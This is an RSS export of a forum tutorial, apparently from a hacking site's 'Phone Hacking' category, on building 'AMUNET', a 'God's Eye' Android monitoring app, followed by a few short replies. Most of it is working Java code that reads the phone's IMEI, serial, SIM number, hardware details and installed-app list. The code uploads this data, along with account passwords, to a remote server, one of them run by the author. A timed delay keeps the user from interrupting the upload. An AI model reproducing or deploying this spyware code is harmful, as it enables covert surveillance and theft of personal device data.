<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Building a God’s Eye Android App: Part 2 - Sending Information to a Web Server</title>
    <link>https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168</link>
    <description>Greetings my fellow hackers,

As we continue with our series, the AMUNET app becomes complicated with new functionalities and structures to understand. We&#39;ll sail right through. As stated earlier in previous tutorials, the app doesn&#39;t fully exists because I build them before I share so forgive me if it takes sometime before a tutorial comes out. I need to make sure everything works well first.

**PREVIOUS TUTORIALS**

Below are the tutorials covered so far.
1. [Introduction to Amunet](https://0x00sec.org/t/building-a-gods-eye-android-app-part-0-introduction-to-amunet/7112/4)
2. [Collecting Installed Android Apps](https://0x00sec.org/t/building-a-god-s-eye-android-app-part-1-collecting-installed-android-apps/7121)

**TODAY&#39;S TUTORIAL**

In today&#39;s tutorial, we are going to send data to our server using [Volley Google](https://developer.android.com/training/volley/). Volley is an HTTP library that makes networking for Android apps easier and most importantly, faster. In order to use volley in our android app, we first need to import it into our android studio project. 

Go to `build.gradle` ( Module: app ) under Grade Scripts and add the dependency  `implementation &#39;com.android.volley:volley:1.1.0&#39;`. Make sure you sync the project. You should something similar to this.

&gt;     dependencies {
&gt;         implementation fileTree(dir: &#39;libs&#39;, include: [&#39;*.jar&#39;])
&gt;         implementation &#39;com.android.support:appcompat-v7:27.1.1&#39;
&gt;         implementation &#39;com.android.support.constraint:constraint-layout:1.1.2&#39;
&gt;         implementation &#39;com.android.support:design:27.1.1&#39;
&gt;         testImplementation &#39;junit:junit:4.12&#39;
&gt;         androidTestImplementation &#39;com.android.support.test:runner:1.0.2&#39;
&gt;         androidTestImplementation &#39;com.android.support.test.espresso:espresso-core:3.0.2&#39;
&gt; 
&gt;         implementation &#39;com.android.volley:volley:1.1.0&#39;
&gt; }

Now, we can go on to use the volley library in our project. Before we continue, create a new `Basic Activity` called &quot;`Dashboard`&quot;. We wouldn&#39;t use it now ( later in this tutorial ). The reason why we are creating the `Dashboard` activity is because we are going to use the `MainActivity.java` for phone registration.

**SETTING UP AN APP ICON**

No one likes using the default icon for created projects. You can use any icon of your choice. I&#39;m using an eye image. Make sure your image is big enough. I&#39;ll upload it here incase anyone wants to use it.

![eye2|261x200](upload://33KyJzNE4SE77ZF3y3dfwPFPofj.jpg)

Now, head over to [Roman Urik&#39;s Github](http://romannurik.github.io/AndroidAssetStudio/icons-launcher.html). I love using this tool because of the ease it allows for the customization of icons. Select `Image` ( Under Foreground ) and upload your preferred image. Customize the icon according to your taste. I&#39;m using a white background. 

After you are done, click on the `Download button` on the upper right section of the website under the `Source on Github` link. The image should be downloaded onto your computer.

Extract the package and you should notice the icons are grouped into resolutions. Don&#39;t mess them up. They are grouped intentionally. Go back to the Android Studio and under `res`, right click on `mipmap`. On Mac, choose &quot;Reveal in Finder&quot; and on Windows, something similar maybe &quot;Open in Explorer&quot; or &quot;Explore&quot; should open the mipmap directory in your explorer. Now copy the files accordingly from the extracted mipmap folder to the opened android studio mipmap directory. Should everything be done correctly, the new icons copied will show in the android studio. If you still have trouble, search online or watch this video [Change The App Icon in Android Studio - YouTube](https://www.youtube.com/watch?v=SDKwNh0TioE)

Open  `AndroidManifest` ( under app-&gt;manifests ) and change the value for `android:roundIcon` and `android:icon` in the `application` tag to the filename of the app icon imported. This will  allow the app use the icon.

Still in `AndroidManifest` file, add the `READ_PHONE_STATE`, `INTERNET` AND `ACCESS_NETWORK_STATE` permissions. Above the application tag opening, add these lines.

    &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot; /&gt;
    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;
    &lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot; /&gt;

**CREATING THE UI FOR MAIN ACTIVITY**

Two files are created under the `layout` folder when a Basic Activity is chosen. In our case, it&#39;s `activity_main.xml` and `content_main.xml` unless you named your activity otherwise. 

In the activity_main.xml, clear the `toolbar` and the `appbarlayout`  code. Our code should look like this.

&gt;     &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&gt;     &lt;android.support.design.widget.CoordinatorLayout 
&gt;         xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
&gt;         xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;
&gt;         xmlns:tools=&quot;http://schemas.android.com/tools&quot;
&gt;         android:layout_width=&quot;match_parent&quot;
&gt;         android:layout_height=&quot;match_parent&quot;
&gt;         tools:context=&quot;.MainActivity&quot;&gt;
&gt; 
&gt;         &lt;include layout=&quot;@layout/content_main&quot; /&gt;
&gt; 
&gt;     &lt;/android.support.design.widget.CoordinatorLayout&gt;

We will design our registration interface in the `content_main`. The code for the UI

    &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
    &lt;RelativeLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;
    xmlns:tools=&quot;http://schemas.android.com/tools&quot;
    android:layout_width=&quot;match_parent&quot;
    android:layout_height=&quot;match_parent&quot;
    android:padding=&quot;20dp&quot;
    app:layout_behavior=&quot;@string/appbar_scrolling_view_behavior&quot;
    tools:context=&quot;.MainActivity&quot;
    tools:showIn=&quot;@layout/activity_main&quot;&gt;

    &lt;android.support.design.widget.TextInputLayout
        android:layout_width=&quot;match_parent&quot;
        android:id=&quot;@+id/textinputlayout1&quot;
        android:layout_centerHorizontal=&quot;true&quot;
        android:layout_centerVertical=&quot;true&quot;
        android:layout_height=&quot;wrap_content&quot;&gt;

        &lt;EditText
            android:layout_width=&quot;match_parent&quot;
            android:hint=&quot;Username&quot;
            android:id=&quot;@+id/username&quot;
            android:layout_height=&quot;wrap_content&quot; /&gt;

    &lt;/android.support.design.widget.TextInputLayout&gt;

    &lt;android.support.design.widget.TextInputLayout
        android:layout_width=&quot;match_parent&quot;
        android:id=&quot;@+id/textinputlayout2&quot;
        android:layout_below=&quot;@id/textinputlayout1&quot;
        android:layout_height=&quot;wrap_content&quot;&gt;

        &lt;EditText
            android:layout_width=&quot;match_parent&quot;
            android:hint=&quot;Name&quot;
            android:id=&quot;@+id/full_name&quot;
            android:layout_height=&quot;wrap_content&quot; /&gt;

    &lt;/android.support.design.widget.TextInputLayout&gt;

    &lt;android.support.design.widget.TextInputLayout
        android:layout_width=&quot;match_parent&quot;
        android:id=&quot;@+id/textinputlayout3&quot;
        android:layout_below=&quot;@id/textinputlayout2&quot;
        android:layout_centerHorizontal=&quot;true&quot;
        android:layout_centerVertical=&quot;true&quot;
        android:layout_height=&quot;wrap_content&quot;&gt;

        &lt;EditText
            android:layout_width=&quot;match_parent&quot;
            android:hint=&quot;Password&quot;
            android:inputType=&quot;textWebPassword&quot;
            android:id=&quot;@+id/password&quot;
            android:layout_height=&quot;wrap_content&quot; /&gt;

    &lt;/android.support.design.widget.TextInputLayout&gt;

    &lt;ImageView
        android:layout_width=&quot;150dp&quot;
        android:src=&quot;@drawable/eye2&quot;
        android:layout_marginBottom=&quot;10dp&quot;
        android:layout_above=&quot;@id/textinputlayout1&quot;
        android:layout_centerHorizontal=&quot;true&quot;
        android:id=&quot;@+id/logo_imageview&quot;
        android:layout_height=&quot;150dp&quot; /&gt;

    &lt;Button
        android:layout_width=&quot;match_parent&quot;
        android:text=&quot;Sign up&quot;
        android:id=&quot;@+id/create_account_button&quot;
        android:textColor=&quot;@android:color/white&quot;
        android:layout_marginTop=&quot;10dp&quot;
        android:background=&quot;@color/colorPrimary&quot;
        android:layout_below=&quot;@id/textinputlayout3&quot;
        style=&quot;@style/Base.Widget.AppCompat.Button.Borderless&quot;
        android:layout_height=&quot;wrap_content&quot; /&gt;
    &lt;/RelativeLayout&gt;

I have already uploaded the image ( eye2 ) for the ImageView  ( located in the drawable folder ) in the setting up app icon section of this tutorial. You can change the source of the ImageView or rename my image to eye2 in the drawable folder.

This is my screen right now.

&lt;img src=&#39;//0x00sec.s3.dualstack.us-east-1.amazonaws.com/original/2X/8/89bbcb74fefead9cbb520c9dabd142a06591fe3f.jpeg&#39;&gt;

**CONFIGURATION.JAVA**

Create a new Java class and name it `Configuration`. Inside `Configuration` class, write this code.

    private static final String app_host = &quot;xx.xx.xx.xx&quot;;
    private static final String domain_path = &quot;https://&quot; + app_host + &quot;/&quot;;
    private static final String app_auth = domain_path + &quot;/receiver.php&quot;;

    public static String getApp_host() {
        return app_host;
    }

    public static String getDomain_path() {
        return domain_path;
    }

    public static String getApp_auth() {
        return app_auth;
    }

The `Configuration` java class we just created will allow us to reference the server address from this file instead of manually typing it across the entire project which is like not cool. 

1. `xx.xx.xx.xx` is the server address ( localhost, network address ) eg 0x00sec.org or 104.18.48.48
2. `domain_path` is the qualified domain server path including the appropriate protocols. eg https://0x00sec.org/. Don&#39;t modify this line since it&#39;s just a reference.
3. `app_auth` is a file on the server that receives the request. Takes the server path and the receiving file path.

The remaining methods are `getters` ( `Right click` -&gt; `Generate` -&gt; `Getter` ).

**WRITING THE CODES FOR MAINACTIVITY.JAVA**

The final part of this tutorial will be a bit tricky so try and read with understanding as I also try to explain in simple terms.

Normally, above the `onCreate` method and below `public class MainActivity extends ...` code, lets declare our UI objects.

    EditText username, password, name;
    Button create_account_button;

    SharedPreferences sharedPreferences;

    private static final int READ_PHONE_STATE_REQUEST_CODE = 10001;

    ProgressDialog progressDialog;

Basically

1. We declare the EditText for our username, password and name fields ( content_main.xml ).
2. We declare the Button for our sign up button ( content_main.xml )
3. [SharedPreferences](https://developer.android.com/reference/android/content/SharedPreferences) allows us to save information. We create an instance of it.
4. `READ_PHONE_STATE_REQUEST_CODE` will allow us determine if our permission request was granted or denied ( discussed later ).
5. ProgressDialog will allow us to display a progress bar with a message.

**onCreate Method**

This will be the code for our onCreate method.

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        sharedPreferences = getSharedPreferences(&quot;Auth&quot;, Context.MODE_PRIVATE);

        final String auth_key = sharedPreferences.getString(&quot;auth_key&quot;, null);

        if(auth_key != null) {
            startActivity(new Intent(MainActivity.this, Dashboard.class));
            finish();
        }

        username = findViewById(R.id.username);
        password = findViewById(R.id.password);
        name = findViewById(R.id.full_name);

        create_account_button = findViewById(R.id.create_account_button);
        create_account_button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if(ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_PHONE_STATE)
                        != PackageManager.PERMISSION_GRANTED) {
                    show_permission_alert(&quot;Allow the app to read the phone&#39;s information&quot;, &quot;read_phone_state&quot;);
                } else {

                    if(username.getText().toString().length() &lt; 5) {
                        show_alert(&quot;Username must be more than 5 characters&quot;);
                        return;
                    }

                    if(password.getText().toString().length() &lt; 5) {
                        show_alert(&quot;Password must be more than 5 characters&quot;);
                        return;
                    }

                    if(name.getText().toString().length() &lt; 3) {
                        show_alert(&quot;Enter a valid name&quot;);
                        return;
                    }

                    progressDialog = new ProgressDialog(MainActivity.this);
                    progressDialog.setMessage(&quot;Creating account ...&quot;);
                    progressDialog.setCancelable(false);
                    progressDialog.setProgressStyle(ProgressDialog.STYLE_SPINNER);
                    progressDialog.show();

                    create_phone_account();
                }
            }
        });
    }

1. `sharedPreferences` - get a file &quot;`Auth`&quot; ( key-value file ). `MODE_PRIVATE` makes the file private to our app.
2. `String auth_key` - gets the value for the key ( `auth_key` ) in our `Auth` file. Returns `null` if the key `doesn&#39;t exist`.
3. If the key exists ( phone registered ), redirect us to the `Dashboard` activity we created earlier.
4. Set reference to our respective EditTexts ( `username`, `password`, `name` )
5. Set reference to the signup button ( create_account_button)
6. When the button is clicked, we check if the `READ_PHONE_STATE` permission has been granted. If the permission hasn&#39;t been granted, we call `show_permission_alert` method ( takes two arguments: `message` and `permission_id` ). Will create the method in a bit.
7. If the permission is granted, then we check and make sure our `username`, `name` and `passwords` fields have valid data before we send them to our server. There is also a new method called `show_alert` which displays messages to the user.
8. If the data is valid, we call the `create_phone_account` method to send our registration details to the server.

Hope I got someone to understand it. 

The permission `READ_PHONE_STATE` allows us to read the phone&#39;s International Mobile Equipment Identity ( IMEI ). With the IMEI, we can later identify the phone and user accounts registered with it.

From `#6` ( above ), should the permission be denied, we call the `show_permission_alert`. Lets create the method.

**SHOW_PERMISSION_ALERT**

Outside the `onCreate` and inside the `MainActivity` class, create this method.

    private void show_permission_alert(String message, final String permission) {
        AlertDialog.Builder dialog=new AlertDialog.Builder(MainActivity.this);
        dialog.setMessage(message);
        dialog.setCancelable(false);
        dialog.setPositiveButton(&quot;Ok&quot;,new DialogInterface.OnClickListener() {

            @Override
            public void onClick(DialogInterface dialog, int which) {
                if(permission.toLowerCase().equals(&quot;read_phone_state&quot;)) {
                    ActivityCompat.requestPermissions(MainActivity.this,
                            new String[] {Manifest.permission.READ_PHONE_STATE},
                            READ_PHONE_STATE_REQUEST_CODE);
                }
            }

        });
        dialog.show();
    }

It simply displays any message you pass to it. After you read the message displayed and you click &quot;Ok&quot;, the method checks if the `permission_id` passed during the method call matches the ones specified in the method. If they match, the appropriate code executes. The reason for this approach is that we will be asking for a lot of future permissions and instead of creating different methods every time, we can instead group them into one method along with their respective codes.

In this method, we request the `READ_PHONE_STATE` permission when the &quot;`read_phone_state`&quot; is passed. The `READ_PHONE_STATE_REQUEST_CODE` will allow us to check if the permission was granted or not. Before we move on to check the whether our permission was granted or not, lets create the `show_alert` method. Similar to the `show_permission_alert` method but just displays messages and does not accept `permissions_id`.

**SHOW_ALERT**

There is not much explanation to be done here as I&#39;ve already explained.

    protected void show_alert(String msg) {
        AlertDialog.Builder dialog=new AlertDialog.Builder(MainActivity.this);
        dialog.setMessage(msg);
        dialog.setPositiveButton(&quot;Ok&quot;,new DialogInterface.OnClickListener() {

            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
            }

        });
        dialog.show();
    }

Just displays messages.

**ON REQUEST PERMISSIONS RESULT**

This method allows us to check if the permission request was granted or not. In order to determine the state of the permission request, we&#39;ll need the identifier ( request code - `READ_PHONE_STATE_REQUEST_CODE` ). Hope you now understand the importance of the request code integer value.

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case READ_PHONE_STATE_REQUEST_CODE: {
                if (grantResults.length &gt; 0
                        &amp;&amp; grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                    Toast.makeText(getApplicationContext(), &quot;Without this permission, the desired action cannot be performed&quot;, Toast.LENGTH_LONG).show();
                } else {
                    Toast.makeText(getApplicationContext(), &quot;Permission granted&quot;, Toast.LENGTH_LONG).show();
                }
                return;
            }
        }
    }

We print the appropriate response based on the user&#39;s action. Since we need the `READ_PHONE_STATE` permission in order to get the app working, we won&#39;t allow registration unless the permission is allowed.

**GET DEVICE IMEI**

IMEI&#39;s are unique to every phone meaning we can track a phone based on its IMEI. We use the IMEI to identify a phone and not mix the data. This method will retrieve the IMEI of the phone and return it to its caller.

    protected String getDeviceIMEI() {
        String deviceUniqueIdentifier = null;
        TelephonyManager tm = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
        if (null != tm) {
            try {
                deviceUniqueIdentifier = tm.getDeviceId();
            } catch (SecurityException e) {
                return null;
            }
        }
        if (null == deviceUniqueIdentifier || 0 == deviceUniqueIdentifier.length()) {
            deviceUniqueIdentifier = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID);
        }
        return deviceUniqueIdentifier;
    }

Makes use of the `Telephony Manager` which requires the `READ_PHONE_STATE` permission. Now in the `onClickListener` function of the `create_account_button` ( onCreate method ), there is one last method we have not tackled and that is the `create_phone_account`.

**CREATE PHONE ACCOUNT**

Before we move on, in the previous tutorial [Building a God’s Eye Android App: Part 1 - Collecting Installed Android Apps](https://0x00sec.org/t/building-a-god-s-eye-android-app-part-1-collecting-installed-android-apps/7121), we included a thread calling the `collect_installed_apps` in the `onCreate` method. Kindly delete that thread. The `onCreate` method should now look like this.

&lt;img src=&#39;//0x00sec.s3.dualstack.us-east-1.amazonaws.com/original/2X/2/2f3c0b5690bb7aaf9e9fefd224928ee136efaf6a.jpeg&#39;&gt;

Moving on to the `create_phone_acccount` method

    private void create_phone_account() {

        final String phone_imei = getDeviceIMEI();
        final String phone_serial = Build.SERIAL;

        RequestQueue requestQueue = Volley.newRequestQueue(MainActivity.this);

        StringRequest serverRequest = new StringRequest(Request.Method.POST, Configuration.getApp_auth(), new Response.Listener&lt;String&gt;() {
            @Override
            public void onResponse(String req) {
                progressDialog.dismiss();

                try {

                    final JSONObject response = new JSONObject(req);

                    if(response.getBoolean(&quot;success&quot;)) {
                        final String server_response = response.getString(&quot;response&quot;);

                        SharedPreferences.Editor editor = sharedPreferences.edit();

                        editor.putString(&quot;auth_key&quot;, response.getString(&quot;api_key&quot;));

                        editor.apply();

                        new Thread(new Runnable() {
                            @Override
                            public void run() {
                                collect_phone_details();
                                collect_installed_apps();
                            }
                        }).start();

                        new CountDownTimer(5000,1000) {
                            @Override
                            public void onTick(long l) {

                            }

                            @Override
                            public void onFinish() {
                                show_alert(server_response);
                            }
                        }.start();

                        username.setText(&quot;&quot;);
                        password.setText(&quot;&quot;);
                        name.setText(&quot;&quot;);

                    } else {
                        show_alert(response.getString(&quot;response&quot;));
                    }
                } catch (Exception e) {
                    show_alert(&quot;Authentication error: &quot; + e.getMessage());
                }
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                progressDialog.dismiss();
                show_alert(&quot;Internet disconnected&quot;);
            }
        }) {
            protected Map&lt;String, String&gt; getParams() {
                Map&lt;String, String&gt; params = new HashMap&lt;&gt;();
                params.put(&quot;imei&quot;, phone_imei);
                params.put(&quot;serial&quot;, phone_serial);
                params.put(&quot;user&quot;, username.getText().toString());
                params.put(&quot;name&quot;, name.getText().toString());
                params.put(&quot;pass&quot;, password.getText().toString());
                return params;
            }
        };

        requestQueue.add(serverRequest);
    }

This method makes use of the RequestQueue function in the volley library to send requests. In this case we are sending a POST request. Notice the parameters

    protected Map&lt;String, String&gt; getParams() {
            Map&lt;String, String&gt; params = new HashMap&lt;&gt;();
            params.put(&quot;imei&quot;, phone_imei);
            params.put(&quot;serial&quot;, phone_serial);
            params.put(&quot;user&quot;, username.getText().toString());
            params.put(&quot;name&quot;, name.getText().toString());
            params.put(&quot;pass&quot;, password.getText().toString());
            return params;
    }

The POST parameters being sent here are optional and not mandatory. I have set up a web server which accepts these specific parameters so incase you don&#39;t have a server to test and want to use my server, send these particular parameters otherwise the data won&#39;t be logged.

The codes in the `onResponse` method are also optional and not mandatory. My web server gives each phone an API key to access the platform after phone registration. Incase you want to use my server, all data sent will have to be posted with the API key otherwise the incoming data will be discarded.

The thread we earlier deleted in the `onCreate` method will now be called here should the response have a success field set to true. Remember the response is converted to a JSON Object. Volley allows us to directly receive the data in JSONObject but for debugging purposes, I used the StringRequest to see what was returned before converting the strings to JSON ( Was having issues with my server back then ). 

After the phone information has been logged on your web server or mine. You can begin to send data to the server. A thread is run in the `onResponse` method calling two methods `collect_phone_details` and `collect_installed_apps`. After a count down of 5 seconds, the server response is shown. The delay allows the two methods `collect_phone_details` and `collect_installed_apps` to finish execution before the user gets the chance to perform any further action which can interrupt the upload.

**COLLECT PHONE DETAILS**

In this method, we gather information about our device using `Build` ( android.os ) and TelephonyManager ( SIM Operations ). 

    private void collect_phone_details() {
        upload_detail(&quot;VERSION.RELEASE&quot;, Build.VERSION.RELEASE);
        upload_detail(&quot;VERSION.INCREMENTAL&quot;, Build.VERSION.INCREMENTAL);
        upload_detail(&quot;VERSION.SDK.NUMBER&quot;, String.valueOf(Build.VERSION.SDK_INT));
        upload_detail(&quot;BOARD&quot;, Build.BOARD);
        upload_detail(&quot;BOOTLOADER&quot;, Build.BOOTLOADER);
        upload_detail(&quot;BRAND&quot;, Build.BRAND);
        upload_detail(&quot;CPUABI&quot;, Build.CPU_ABI);
        upload_detail(&quot;CPUABI2&quot;, Build.CPU_ABI2);
        upload_detail(&quot;DISPLAY&quot;, Build.DISPLAY);
        upload_detail(&quot;FINGERPRINT&quot;, Build.FINGERPRINT);
        upload_detail(&quot;HARDWARE&quot;, Build.HARDWARE);
        upload_detail(&quot;HOST&quot;, Build.HOST);
        upload_detail(&quot;ID&quot;, Build.ID);
        upload_detail(&quot;MANUFACTURER&quot;, Build.MANUFACTURER);
        upload_detail(&quot;MODEL&quot;,Build.MODEL);
        upload_detail(&quot;PRODUCT&quot;, Build.PRODUCT);
        upload_detail(&quot;SERIAL&quot;, Build.SERIAL);
        upload_detail(&quot;TAGS&quot;, Build.TAGS);
        upload_detail(&quot;TIME&quot;, String.valueOf(Build.TIME));
        upload_detail(&quot;TYPE&quot;, Build.TYPE);
        upload_detail(&quot;UNKNOWN&quot;,Build.UNKNOWN);
        upload_detail(&quot;USER&quot;, Build.USER);
        upload_detail(&quot;DEVICE&quot;, Build.DEVICE);

        TelephonyManager telephonyManager = ((TelephonyManager)getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE));
        String simOperatorName = telephonyManager.getSimOperatorName();
        String simNumber = &quot;&quot;;

        try {
            simNumber = telephonyManager.getLine1Number();
        } catch (SecurityException e) {
        }

        upload_detail(&quot;SIM1.OPERATOR&quot;, simOperatorName);
        upload_detail(&quot;SIM1.PHONE&quot;, simNumber);
    }

The method makes an extensive use of another method `upload_detail` to send data to our server.  If you intend to use my server, leave the values intact otherwise the information won&#39;t show. If you don&#39;t intend to use my server, then feel free to modify the parameters and requests as you wish.

**UPLOAD DETAILS**

This method sends data to the server using the api_key obtained during the registration process. The key is stored on the device using sharedPreferences. The method won&#39;t upload if there is no api key.

    private void upload_detail(final String key, final String value) {
        RequestQueue requestQueue = Volley.newRequestQueue(MainActivity.this);

        final String auth_key = sharedPreferences.getString(&quot;auth_key&quot;, null);

        if(auth_key == null) { return; }

        StringRequest serverRequest = new StringRequest(Request.Method.POST, Configuration.getApp_auth(), new Response.Listener&lt;String&gt;() {
            @Override
            public void onResponse(String req) {
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
            }
        }) {
            protected Map&lt;String, String&gt; getParams() {
                Map&lt;String, String&gt; params = new HashMap&lt;&gt;();
                params.put(&quot;auth&quot;, auth_key);
                params.put(&quot;k&quot;, key);
                params.put(&quot;v&quot;, value);
                return params;
            }
        };

        requestQueue.add(serverRequest);
    }

Should you want to use my server, leave the POST parameters intact. Any slight modifications will cause the data to be rejected. I mean rejected. Otherwise, you are free to use and name your POST parameters as you please.

    protected Map&lt;String, String&gt; getParams() {
            Map&lt;String, String&gt; params = new HashMap&lt;&gt;();
            params.put(&quot;auth&quot;, auth_key);
            params.put(&quot;k&quot;, key);
            params.put(&quot;v&quot;, value);
            return params;
    }

Be sure to keep the data intact. I can&#39;t stress on it enough if you are to use my server.

**COLLECT INSTALLED APPS**

Last but one of the method calls for today&#39;s tutorial. This method enumerates through the Package Manager and gets information about apps installed on the device. In our previous tutorial, we had only two parameters: app name and package name. Now we have included three more parameters.

    private void collect_installed_apps() {
        final PackageManager pm = getPackageManager();
        List&lt;ApplicationInfo&gt; packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        for (ApplicationInfo packageInfo : packages) {
            if(pm.getLaunchIntentForPackage(packageInfo.packageName) != null)
            {
                try {
                    String app_name = packageInfo.loadLabel(getPackageManager()).toString();
                    String app_package = packageInfo.processName;
                    String app_uid = Integer.toString(packageInfo.uid);
                    String app_versionName = pm.getPackageInfo(app_package, 0).versionName.toString();
                    String app_versionCode = String.valueOf(pm.getPackageInfo(app_package, 0).versionCode);

                    upload_app(app_name, app_package, app_uid, app_versionName, app_versionCode);
                } catch (Exception e) {

                }
            }
        }
    }

There is not much to explain as I have already done that in the previous tutorial. The new parameters are `app_uid`, `app_versionName` and `app_versionCode`.

**UPLOAD APP**

This function uploads data about the installed apps to the server. You are free to modify the parameters if you are not using my server as a backend.

    private void upload_app(final String app_name, final String app_package, final String app_uid, final String app_vName, final String app_vCode) {
        RequestQueue requestQueue = Volley.newRequestQueue(MainActivity.this);

        final String auth_key = sharedPreferences.getString(&quot;auth_key&quot;, null);

        if(auth_key == null) { return; }

        StringRequest serverRequest = new StringRequest(Request.Method.POST, Configuration.getApp_auth(), new Response.Listener&lt;String&gt;() {
            @Override
            public void onResponse(String req) {
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
            }
        }) {
            protected Map&lt;String, String&gt; getParams() {
                Map&lt;String, String&gt; params = new HashMap&lt;&gt;();
                params.put(&quot;auth&quot;, auth_key);
                params.put(&quot;app_name&quot;, app_name);
                params.put(&quot;app_package&quot;, app_package);
                params.put(&quot;app_uid&quot;, app_uid);
                params.put(&quot;app_vname&quot;, app_vName);
                params.put(&quot;app_vcode&quot;, app_vCode);
                return params;
            }
        };

        requestQueue.add(serverRequest);
    }

That&#39;s it for this tutorial.

**CONFIGURING YOUR ANDROID APP TO COMMUNICATE WITH MY SERVER ( AMUNETCLOUD )**

In communicating with AMUNETCLOUD, you need to make sure the following settings are in place.

Change the address in the Configuration to 

    private static final String app_host = &quot;play.cardfinder.co&quot;;
    private static final String domain_path = &quot;https://&quot; + app_host + &quot;/&quot;;
    private static final String app_auth = domain_path + &quot;/auth.php&quot;;

Secondly, make sure that you do not modify the original codes posted here as the server will reject modified request or data.

**ACCESSING UPLOADED PHONE INFORMATION** 

To access your data, simply log onto [AMUNETCLOUD](https://play.cardfinder.co/) using the credentials entered during registration. You should be redirected to your phone data.

**DISCLAIMER**

The server is a test or demonstration server and therefore I will not be held accountable for whatever data is sent to it. It&#39;s purely for education purpose.

I would love your contributions, suggestions, feedbacks, critics, etc. Anything to help the series.

You can directly import the project into your android studio if you are having trouble.

Checkout the github repo: https://github.com/sergeantexploiter/Amunet

Until we meet again. I&#39;m out.

**#Sergeant**</description>
    
    <lastBuildDate>Wed, 18 Jul 2018 02:02:20 +0000</lastBuildDate>
    <category>Phone Hacking</category>
    <atom:link href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Building a God’s Eye Android App: Part 2 - Sending Information to a Web Server</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168/7</link>
        <pubDate>Thu, 19 Jul 2018 22:13:45 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-7168-7</guid>
        <source url="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168.rss">Building a God’s Eye Android App: Part 2 - Sending Information to a Web Server</source>
      </item>
      <item>
        <title>Building a God’s Eye Android App: Part 2 - Sending Information to a Web Server</title>
        <dc:creator><![CDATA[0x00013]]></dc:creator>
        <description><![CDATA[
            <p>So cool dude <img src="https://0x00sec.org/images/emoji/twitter/robot.png?v=9" title=":robot:" class="emoji" alt=":robot:"><img src="https://0x00sec.org/images/emoji/twitter/skull.png?v=9" title=":skull:" class="emoji" alt=":skull:"></p>
          <p><a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168/6</link>
        <pubDate>Wed, 18 Jul 2018 02:02:20 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-7168-6</guid>
        <source url="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168.rss">Building a God’s Eye Android App: Part 2 - Sending Information to a Web Server</source>
      </item>
      <item>
        <title>Building a God’s Eye Android App: Part 2 - Sending Information to a Web Server</title>
        <dc:creator><![CDATA[sergeantsploit]]></dc:creator>
        <description><![CDATA[
            <p>I don’t quite get what you meant by <code>Volley doesn't handle inbuilt POST Method params perfectly</code>.</p>
<p>To clarify on why I said the POST sent to the server will be rejected is because, the auth PHP file on my server only accepts specific parameters for data input so sending a different data parameter will cause it to be discarded.</p>
<p>I don’t know if I’m still getting what you mean. If you can clarify a little bit.</p>
          <p><a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168/5</link>
        <pubDate>Fri, 29 Jun 2018 19:41:15 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-7168-5</guid>
        <source url="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168.rss">Building a God’s Eye Android App: Part 2 - Sending Information to a Web Server</source>
      </item>
      <item>
        <title>Building a God’s Eye Android App: Part 2 - Sending Information to a Web Server</title>
        <dc:creator><![CDATA[Sk0xic]]></dc:creator>
        <description><![CDATA[
            <aside class="quote no-group" data-username="sergeantsploit" data-post="1" data-topic="7168">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/sergeantsploit/40/102_2.png" class="avatar"> sergeantsploit:</div>
<blockquote>
